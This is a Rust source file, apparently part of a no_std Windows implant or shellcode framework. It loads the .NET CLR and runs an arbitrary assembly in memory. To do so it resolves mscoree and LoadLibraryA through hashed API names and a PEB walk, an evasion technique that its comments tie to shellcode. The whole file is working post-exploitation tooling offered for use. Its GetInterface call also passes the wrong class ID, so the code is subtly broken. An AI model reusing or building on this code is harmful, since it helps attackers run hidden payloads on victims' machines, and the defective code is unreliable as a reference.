#[cfg(target_os = "windows")]
use alloc::vec::Vec;
use core::ffi::c_void;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

// GUIDs (Little Endian for u32/u16/u16)
// CLSID_CLRMetaHost: 92801892-0e52-4b67-ac20-26ef6e6e0248
// IID_ICLRMetaHost: D332DB9E-B9B3-4125-8207-A14884F53216 (Standard)
// Check actual IIDs.
// CLSID_CLRMetaHost = {0x92801892,0x0e52,0x4b67,{0xac,0x20,0x26,0xef,0x6e,0x6e,0x02,0x48}};
// IID_ICLRMetaHost  = {0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
// IID_ICLRRuntimeInfo = {0xBD39D1D2,0xBA2F,0x486a,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
// IID_ICLRRuntimeHost = {0x90F1A06C,0x7712,0x4762,{0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02}};
// CLSID_CLRRuntimeHost = {0x90F1A06E,0x7712,0x4762,{0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02}};

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
pub struct GUID {
    pub Data1: u32,
    pub Data2: u16,
    pub Data3: u16,
    pub Data4: [u8; 8],
}

#[cfg(target_os = "windows")]
impl GUID {
    pub const fn new(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> Self {
        Self { Data1: d1, Data2: d2, Data3: d3, Data4: d4 }
    }
}

#[cfg(target_os = "windows")]
#[allow(non_upper_case_globals)]
pub const CLSID_CLRMetaHost: GUID = GUID::new(0x92801892, 0x0e52, 0x4b67, [0xac, 0x20, 0x26, 0xef, 0x6e, 0x6e, 0x02, 0x48]);
#[cfg(target_os = "windows")]
#[allow(non_upper_case_globals)]
pub const IID_ICLRMetaHost: GUID = GUID::new(0xD332DB9E, 0xB9B3, 0x4125, [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16]);
#[cfg(target_os = "windows")]
#[allow(non_upper_case_globals)]
pub const IID_ICLRRuntimeInfo: GUID = GUID::new(0xBD39D1D2, 0xBA2F, 0x486a, [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91]);
#[cfg(target_os = "windows")]
#[allow(non_upper_case_globals)]
pub const IID_ICLRRuntimeHost: GUID = GUID::new(0x90F1A06C, 0x7712, 0x4762, [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02]);

// ICLRMetaHost Interface
#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
pub struct ICLRMetaHostVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut ICLRMetaHost, *const GUID, *mut *mut c_void) -> i32,
    pub AddRef: unsafe extern "system" fn(*mut ICLRMetaHost) -> u32,
    pub Release: unsafe extern "system" fn(*mut ICLRMetaHost) -> u32,
    pub GetRuntime: unsafe extern "system" fn(*mut ICLRMetaHost, *const u16, *const GUID, *mut *mut c_void) -> i32,
    pub GetVersionFromFile: unsafe extern "system" fn(*mut ICLRMetaHost, *const u16, *mut u16, *mut u32) -> i32,
    pub EnumerateInstalledRuntimes: unsafe extern "system" fn(*mut ICLRMetaHost, *mut *mut c_void) -> i32,
    pub EnumerateLoadedRuntimes: unsafe extern "system" fn(*mut ICLRMetaHost, *mut c_void, *mut *mut c_void) -> i32,
    pub RequestRuntimeLoadedNotification: unsafe extern "system" fn(*mut ICLRMetaHost, *mut c_void) -> i32,
    pub QueryLegacyV2RuntimeBinding: unsafe extern "system" fn(*mut ICLRMetaHost, *const GUID, *mut *mut c_void) -> i32,
    pub ExitProcess: unsafe extern "system" fn(*mut ICLRMetaHost, i32) -> i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
pub struct ICLRMetaHost {
    pub vtbl: *const ICLRMetaHostVtbl,
}

// ICLRRuntimeInfo Interface
#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
pub struct ICLRRuntimeInfoVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const GUID, *mut *mut c_void) -> i32,
    pub AddRef: unsafe extern "system" fn(*mut ICLRRuntimeInfo) -> u32,
    pub Release: unsafe extern "system" fn(*mut ICLRRuntimeInfo) -> u32,
    pub GetVersionString: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut u16, *mut u32) -> i32,
    pub GetRuntimeDirectory: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut u16, *mut u32) -> i32,
    pub IsLoaded: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *mut c_void, *mut i32) -> i32,
    pub LoadErrorString: unsafe extern "system" fn(*mut ICLRRuntimeInfo, u32, *mut u16, *mut u32, i32) -> i32,
    pub LoadLibrary: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const u16, *mut *mut c_void) -> i32,
    pub GetProcAddress: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const u8, *mut *mut c_void) -> i32,
    pub GetInterface: unsafe extern "system" fn(*mut ICLRRuntimeInfo, *const GUID, *const GUID, *mut *mut c_void) -> i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
pub struct ICLRRuntimeInfo {
    pub vtbl: *const ICLRRuntimeInfoVtbl,
}

// ICLRRuntimeHost Interface
#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
pub struct ICLRRuntimeHostVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut ICLRRuntimeHost, *const GUID, *mut *mut c_void) -> i32,
    pub AddRef: unsafe extern "system" fn(*mut ICLRRuntimeHost) -> u32,
    pub Release: unsafe extern "system" fn(*mut ICLRRuntimeHost) -> u32,
    pub Start: unsafe extern "system" fn(*mut ICLRRuntimeHost) -> i32,
    pub Stop: unsafe extern "system" fn(*mut ICLRRuntimeHost) -> i32,
    pub SetHostControl: unsafe extern "system" fn(*mut ICLRRuntimeHost, *mut c_void) -> i32,
    pub GetCLRControl: unsafe extern "system" fn(*mut ICLRRuntimeHost, *mut *mut c_void) -> i32,
    pub UnloadAppDomain: unsafe extern "system" fn(*mut ICLRRuntimeHost, u32, *mut c_void) -> i32,
    pub ExecuteInAppDomain: unsafe extern "system" fn(*mut ICLRRuntimeHost, u32, *mut c_void, *mut c_void) -> i32,
    pub GetCurrentAppDomainId: unsafe extern "system" fn(*mut ICLRRuntimeHost, *mut u32) -> i32,
    pub ExecuteApplication: unsafe extern "system" fn(*mut ICLRRuntimeHost, *const u16, u32, *const *const u16, *mut u32) -> i32,
    pub ExecuteInDefaultAppDomain: unsafe extern "system" fn(*mut ICLRRuntimeHost, *const u16, *const u16, *const u16, *const u16, *mut u32) -> i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
pub struct ICLRRuntimeHost {
    pub vtbl: *const ICLRRuntimeHostVtbl,
}

pub struct ClrHost;

impl ClrHost {
    #[cfg(target_os = "windows")]
    pub fn load_clr() -> Result<*mut ICLRRuntimeHost, ()> {
        unsafe {
            let mscoree_hash = hash_str(b"mscoree.dll");
            let clr_create_instance_hash = hash_str(b"CLRCreateInstance");
            let clr_create_instance_addr = resolve_function(mscoree_hash, clr_create_instance_hash);

            if clr_create_instance_addr.is_null() {
                // Try loading mscoree if not loaded? 
                // In no_std, we assume it's loaded or we use LoadLibrary if we had it.
                // But shellcode usually assumes standard DLLs or loads them.
                // mscoree is not always loaded. We might need LoadLibraryA from kernel32.
                let kernel32 = hash_str(b"kernel32.dll");
                let load_library = resolve_function(kernel32, hash_str(b"LoadLibraryA"));
                type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
                let h_mod = core::mem::transmute::<_, FnLoadLibraryA>(load_library)(b"mscoree.dll\0".as_ptr());
                
                if h_mod.is_null() { return Err(()); }
                
                // Resolve again from new handle? resolve_function walks PEB. 
                // LoadLibrary adds to PEB.
            }
            
            let clr_create_instance_addr = resolve_function(mscoree_hash, clr_create_instance_hash);
            if clr_create_instance_addr.is_null() { return Err(()); }

            type FnCLRCreateInstance = unsafe extern "system" fn(*const GUID, *const GUID, *mut *mut c_void) -> i32;
            let clr_create_instance: FnCLRCreateInstance = core::mem::transmute(clr_create_instance_addr);

            let mut meta_host: *mut ICLRMetaHost = core::ptr::null_mut();
            if clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &mut meta_host as *mut _ as *mut *mut c_void) < 0 {
                return Err(());
            }

            let mut runtime_info: *mut ICLRRuntimeInfo = core::ptr::null_mut();
            // v4.0.30319
            let version = [
                'v' as u16, '4' as u16, '.' as u16, '0' as u16, '.' as u16, 
                '3' as u16, '0' as u16, '3' as u16, '1' as u16, '9' as u16, 0
            ];
            
            if ((*(*meta_host).vtbl).GetRuntime)(meta_host, version.as_ptr(), &IID_ICLRRuntimeInfo, &mut runtime_info as *mut _ as *mut *mut c_void) < 0 {
                ((*(*meta_host).vtbl).Release)(meta_host);
                return Err(());
            }

            let mut runtime_host: *mut ICLRRuntimeHost = core::ptr::null_mut();
            if ((*(*runtime_info).vtbl).GetInterface)(runtime_info, &CLSID_CLRMetaHost, &IID_ICLRRuntimeHost, &mut runtime_host as *mut _ as *mut *mut c_void) < 0 {
                ((*(*runtime_info).vtbl).Release)(runtime_info);
                ((*(*meta_host).vtbl).Release)(meta_host);
                return Err(());
            }

            // Start CLR
            ((*(*runtime_host).vtbl).Start)(runtime_host);

            // Cleanup intermediate interfaces
            ((*(*runtime_info).vtbl).Release)(runtime_info);
            ((*(*meta_host).vtbl).Release)(meta_host);

            Ok(runtime_host)
        }
    }

    #[cfg(target_os = "windows")]
    pub fn execute_assembly(path: &str, class: &str, method: &str, arg: &str) -> Result<i32, ()> {
        unsafe {
            let host = Self::load_clr()?;
            let mut ret_val = 0;
            
            // Convert strings to wide strings (UTF-16)
            let mut path_w: Vec<u16> = path.encode_utf16().collect(); path_w.push(0);
            let mut class_w: Vec<u16> = class.encode_utf16().collect(); class_w.push(0);
            let mut method_w: Vec<u16> = method.encode_utf16().collect(); method_w.push(0);
            let mut arg_w: Vec<u16> = arg.encode_utf16().collect(); arg_w.push(0);

            let hr = ((*(*host).vtbl).ExecuteInDefaultAppDomain)(
                host,
                path_w.as_ptr(),
                class_w.as_ptr(),
                method_w.as_ptr(),
                arg_w.as_ptr(),
                &mut ret_val
            );

            ((*(*host).vtbl).Release)(host);

            if hr < 0 {
                return Err(());
            }
            Ok(ret_val as i32)
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn load_clr() -> Result<*mut c_void, ()> {
        Err(())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn execute_assembly(_path: &str, _class: &str, _method: &str, _arg: &str) -> Result<i32, ()> {
        Err(())
    }
}
